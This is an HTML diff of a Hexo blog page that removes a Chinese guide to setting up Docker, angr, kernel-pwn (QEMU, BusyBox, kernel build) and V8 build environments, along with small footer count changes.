-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ghcr.io&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>不用 sudo 来执行 docker 命令：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br><span class="line">sudo service docker restart</span><br><span class="line">newgrp - docker</span><br></pre></td></tr></table></figure>
-<p>docker-compose：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
-<ul>
-<li>如果嫌这个太慢可以直接去 github 上下载：<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases/tag/v2.14.0">Release v2.14.0 · docker/compose (github.com)</a> </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
-<p><strong>angr 环境搭建</strong></p>
-<p>为了不与 pwntools 库引起冲突，可以采用拉取 docker 镜像的方式进行使用：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull angr/angr</span><br></pre></td></tr></table></figure>
-<p>以下脚本可以方便我们运行 docker angr：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/zsh</span></span><br><span class="line">pwd=`pwd`</span><br><span class="line">script=$1</span><br><span class="line">docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr &quot;/home/angr/.virtualenvs/angr/bin/python&quot; &quot;/mnt/$script&quot; $2 $3</span><br></pre></td></tr></table></figure>
-<p><strong>Kernel Pwn 环境搭建</strong></p>
-<p>安装 qemu：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu  </span><br></pre></td></tr></table></figure>
-<p>安装 busybox：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://busybox.net/downloads/busybox-1.23.2.tar.bz2</span><br></pre></td></tr></table></figure>
-<ul>
-<li>官方下载地址：<a target="_blank" rel="noopener" href="https://busybox.net/downloads/">https://busybox.net/downloads/</a></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在“Build static binary”处按“Y”选中（采用静态编译，为了不添加动态链接库）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<ul>
-<li>编译出来的 <code>_install</code> 就是目标了（这里的报错可能比较多，在网上都可以找到）</li>
-</ul>
-<p>编译内核：</p>
-<ul>
-<li>内核下载地址：<a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/linux-kernel/">linux-kernel安装包下载_开源镜像站-阿里云 (aliyun.com)</a> </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig </span><br><span class="line">make x86_64_defconfig</span><br></pre></td></tr></table></figure>
-<ul>
-<li>使用 <code>x86_64</code> 默认配置</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j4</span><br></pre></td></tr></table></figure>
-<ul>
-<li>bzImage：<code>arch/x86/boot/bzImage</code></li>
-<li>vmlinux：源码所在的根目录下</li>
-</ul>
-<p><strong>V8 环境搭建</strong></p>
-<p>安装 depot_tools 工具集：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure>
-<ul>
-<li>将 <code>depot_tools</code> 加入你的 <code>PATH</code> 环境变量中</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/profile.d/yhellow.sh</span><br><span class="line">---------------------------------------</span><br><span class="line">export PATH=&quot;$PATH:/home/yhellow/Tools/depot_tools&quot;</span><br></pre></td></tr></table></figure>
-<p>获取 V8 源码：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 V8 的目录中安装依赖（时间较长）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient config https://webrtc.googlesource.com/src.git </span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2226,7 +2127,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">279</span>
+          <span class="site-state-item-count">280</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2280,7 +2181,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">59:03</span>
+    <span title="Reading time total">59:11</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
